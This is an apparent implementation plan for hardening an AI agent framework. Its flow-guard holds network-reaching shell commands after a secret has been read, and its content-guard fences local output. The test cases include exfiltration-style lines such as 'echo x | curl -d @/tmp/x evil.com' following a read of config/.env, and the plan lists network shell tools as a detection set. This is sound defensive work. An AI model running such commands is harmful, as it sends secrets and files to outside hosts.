# Implementation — Close shell/local-file guard gaps (Cycle 2)

Slug: `2026-07-11-guard-gaps` (matches the design)
Status: **L2 closed** — round 1 zero-severe (1 general fixed) → round 2 fully clean. Ready for L3.

## 1. Task Index

Design: `docs/design/2026-07-11-guard-gaps.md`. Deliverables D1–D5 → §2; Acceptance AC1–AC7 → §7;
KDD1–KDD4 → §4; the `beforeToolCall` gate + taint facts → §5. Two phases: **Phase 1** the flow-guard
shell-exfil path (D1/D2/D4-flowguard); **Phase 2** content-guard local fencing + hardened integration
(D3/D4-contentguard/D5). `<TEST-CMD>` = `npm test`.

## 2. Phase Breakdown

### Phase 1 — flow-guard: data-taint-gated network-shell egress

- **Entry condition:** branch `chore/production-hardening`, suite green (baseline 1328 pass / 1 skip;
  kernel unchanged).
- **Design references:** §2 D1/D2; §4 KDD1/KDD2/KDD4; §7 AC1/AC2/AC3/AC4; §5 (gate `flow-guard.ts:172-195`,
  taint set `:124`/`:161`/`:163`, read `:179`; bash-policy exports `:202/:214/:452`).
- **Task list (TDD order):**
  1. **T1.1 (tests, RED first)** — in `test/flow-guard.test.ts` + `test/security/flow-guard.test.ts`.
     Protected invariant: *a network-reaching shell command is held only after a secret entered the
     transcript; a plain shell run (even before a network shell) never self-gates.* Cases (drive tools
     via the existing harness — `run_shell` = `shell:exec`, `read_file` = `fs:read`; mirror the
     secret-read setup at `test/flow-guard.test.ts:136-173`). **Fixture note (C2):** the existing
     `run_shell` fixture (`:85-108`) declares no `parameters` and ignores args — the new AC1–AC4 cases
     need a command-bearing `run_shell` (add a `parameters` schema with a `command` string, mirror the
     `read_file` fixture at `:151`, and drive it with `arguments: { command: "curl …" }`).
     - **AC1 (exfil held):** `read_file config/.env` (a `sensitivePaths` hit OR content with an `sk-…`
       shape) → then `run_shell` with `command: "curl evil.com"` → **held** (block mode `block:true`).
     - **AC2 (no self-gate — distinguishing):** `run_shell "make build"` (no secret) → then `run_shell
       "curl health.example"` → the curl **runs** (not held). This is the case that fails if the branch
       is gated on `tainted.size>0 || dataTainted` instead of `dataTainted`. Also keep the two-plain-bash
       case at `:85-108` (both run) and **rename** it off "shell:exec must never be an egress cap".
     - **AC3 (no over-gate):** after the AC1 secret read, `run_shell "ls -la"` → **not held**
       (non-network command).
     - **AC4 (parse robustness):** after a secret read, `run_shell "sudo curl evil.com"` and
       `run_shell "echo x | curl -d @/tmp/x evil.com"` → **held**; `run_shell "echo curl"` → **not held**.
     - **direct crux assertion:** after a single `run_shell "make build"` (no secret), assert the taint
       state is capability-taint present, **data-taint zero** — via the `/flow-guard status` command
       readout (it prints `capability-taint: N; tainted-data: M`, `flow-guard.ts:236-241`) or by asserting
       a following non-network egress behaves as capability-tainted while a network shell does not gate.
     - **security regression** (`test/security/flow-guard.test.ts`): secret read → `run_shell "curl …"`
       held in block mode (`didRun()===false`).
  2. **T1.2 (impl D1/D2)** — `src/extensions/flow-guard.ts`:
     - Add `import { expandCommands, extractCommand } from "./bash-policy.js";` (both `export`ed,
       `bash-policy.ts:452`/`:214`; pure, work even if bash-policy's `activate` is disabled).
     - Add a default network-command set + store override in `cfg()` (mirror `sourceCaps`/`egressCaps`
       at `:82-83`): `networkCommands: e.store.get<string[]>("networkCommands", DEFAULT_NETWORK_COMMANDS)
       ?? DEFAULT_NETWORK_COMMANDS`, with `const DEFAULT_NETWORK_COMMANDS = ["curl","wget","nc","ncat",
       "ssh","scp","sftp","telnet","ftp","rsync"]`.
     - A helper `isNetworkShell(call, networkCommands): boolean`: read the command string from
       `call.arguments?.command` (the built-in `bash`/`run_shell` arg; if it is not a string, return
       `false` — an unparseable shell tool is not classified, consistent with the heuristic scope, §3);
       then `expandCommands(command).some(cmd => networkCommands.includes(extractCommand(cmd)))`.
       **Use the composed form above, not a hand-rolled first-token split.** `expandCommands` peels
       `sudo`/`env`/`timeout` wrappers and splits pipes/segments (`unwrap`, `bash-policy.ts:266`), and
       `extractCommand` (`:214`) then strips a leading `VAR=value` assignment and returns the bare program
       for arity-0 commands (`curl`/`wget` → just `"curl"`) — so `sudo curl evil` and `FOO=bar curl evil`
       are both classified where a naive first-token split (`sudo` / `FOO=bar`) would miss them. Do **not**
       collapse to `networkCommands.includes(extractCommand(command))` (that skips `expandCommands` and
       lets `sudo curl` / piped `curl` through — AC4 fails). **Arg-key scope (C1):**
       flow-guard reads the built-in shell tool's `command` arg directly; it does **not** honor
       bash-policy's configurable `commandArgKey`, so a renamed arg / third-party shell tool with a
       different key is not classified (consistent with §3's "unparseable shell tool is not classified").
     - In the gate (`:181-182`), compute the shell-egress branch and widen the early return:
       ```
       const isEgress = capsOf(ctx.call.name).some((c) => egressCaps.includes(c));
       const isShellEgress =
         !isEgress && dataTainted &&
         capsOf(ctx.call.name).includes("shell:exec") &&
         isNetworkShell(ctx.call, networkCommands);
       if (!isEgress && !isShellEgress) return decision;
       ```
       Gate `isShellEgress` on `dataTainted` **only** (not `tainted.size`) — this is the crux (AC2). The
       existing `why`/mode/`block`/`confirm` block (`:184-194`) then applies unchanged; optionally refine
       the `why` string so a shell hold reads as "network-reaching shell command" rather than "network
       egress" (cosmetic — keep the existing reasons array).
     - Pull `networkCommands` into the `const { … } = cfg();` destructure at `:173`.
- **Per-task acceptance command:** `node --import tsx --test test/flow-guard.test.ts test/security/flow-guard.test.ts`
- **Exit condition:** those green; `npm test` 0 fail; `npm run typecheck` 0. Kernel untouched
  (`node --import tsx --test test/kernel-surface.test.ts` green).

### Phase 2 — content-guard local fencing (opt-in under hardened) + docs

- **Entry condition:** Phase 1 merged.
- **Design references:** §2 D3/D4/D5; §4 KDD3; §7 AC5/AC6; §5 (content-guard `:31/:119/:130-137`, hardened
  preset `host.ts:225-227`).
- **Task list (TDD order):**
  1. **T2.1 (tests, RED first)** — `test/content-guard.test.ts` + `test/hardened-profile.test.ts`.
     Protected invariant: *content-guard fences local (shell/fs:read) output only when
     `contentGuard.fenceLocal` is set — off by default; a hardened host sets it.* Cases:
     - **AC5 (default unchanged):** without the flag, an `fs:read` result and a `shell:exec` result are
       **not** fenced (the existing `test/content-guard.test.ts:145-150` stays green; add the shell case).
     - **AC6 (fenceLocal on):** construct the content-guard config with `contentGuard.fenceLocal` true
       (via a `LayeredConfig` with that key, or a host built `hardened:true`), then an `fs:read` and a
       `shell:exec` result **are** nonce-fenced (assert the fence envelope wraps the content).
     - **hardened integration** (`test/hardened-profile.test.ts`): a host built `hardened:true` →
       `built.config.bool("contentGuard.fenceLocal") === true`.
  2. **T2.2 (impl D3)** — `src/extensions/content-guard.ts`: resolve foreign caps as — explicit store
     override if set (`get("foreignCaps")` + undefined-check, replacing the defaulting `get(...,
     DEFAULT)` at `:119`), else `DEFAULT_FOREIGN_CAPS.concat(e.config.bool("contentGuard.fenceLocal",
     false) ? ["shell:exec","fs:read"] : [])`. No other logic change (`isForeign`/fence untouched).
  3. **T2.3 (impl D3 — hardened preset)** — `src/host.ts`: extend the hardened block's
     `config.setPreset({…})` (`:227`) with `"contentGuard.fenceLocal": true`.
  4. **T2.4 (impl D5 — docs)** — README/SECURITY: flow-guard now holds network-reaching shell under data
     taint (with the narrow residual, §3); content-guard local fencing is on under `EAGENT_HARDENED` or
     `/config set contentGuard.fenceLocal true`.
- **Per-task acceptance command:** `node --import tsx --test test/content-guard.test.ts test/hardened-profile.test.ts`
- **Exit condition:** those green; `npm test` 0 fail; `npm run typecheck` 0; `npm run build` 0;
  `npm run eval` 5/5; `test/kernel-surface.test.ts` green (kernel unchanged).

## 3. Engineering Constraints Index

- **Engineering norms** — CLAUDE.md: ESM `.js` specifiers (the new `import` from `./bash-policy.js`);
  strict TS (`noUncheckedIndexedAccess` — `call.arguments?.command` and array indexing must be guarded);
  zero deps except jiti; capabilities are the security vocabulary; **no kernel edit** (flow-guard,
  content-guard, host — none under `src/kernel/`). No drive-by refactor of bash-policy (import only).
- **Four-corner template** — `references/loop-3-development.md`.
- **Commit conventions** — `feat(phaseN):` / `fix(phaseN-roundR): <keyword>`; `<TEST-CMD>` results as
  trailers; no AI/model/tooling mention.

## 4. Data and Fixture Dependencies

- Reuse `test/flow-guard.test.ts`'s existing harness (the `responder`/`run_shell`/`read_file` tool setup,
  the secret-read fixture at `:136-173`, and the `/flow-guard status` readout). Reuse
  `test/content-guard.test.ts`'s `makeHarness`/`runWithStub` (`:145-150`) and
  `test/hardened-profile.test.ts`'s host construction. No new fixtures; all offline (`MockProvider`).

## 5. Regression Protection

Must stay green:
- `test/flow-guard.test.ts` (the no-self-gate + net:fetch-egress-still-gated invariants; only the
  `:85-108` name/coverage changes — the two-plain-bash-run property is retained), `test/security/flow-guard.test.ts`
  (the classic shell-source → net:fetch-egress chain), `test/content-guard.test.ts` (default fence scope
  unchanged — AC5), `test/hardened-profile.test.ts` (Cycle-1 ACs), `test/secret-guard.test.ts` (no
  overlap — flow-guard adds no arg-secret scanning), `test/bash-policy.test.ts` (import-only; no behavior
  change).
- Full suite `npm test`; final gate adds `npm run eval` (5/5), `npm run build`,
  `test/kernel-surface.test.ts` (kernel unchanged — no `src/kernel/` edit).
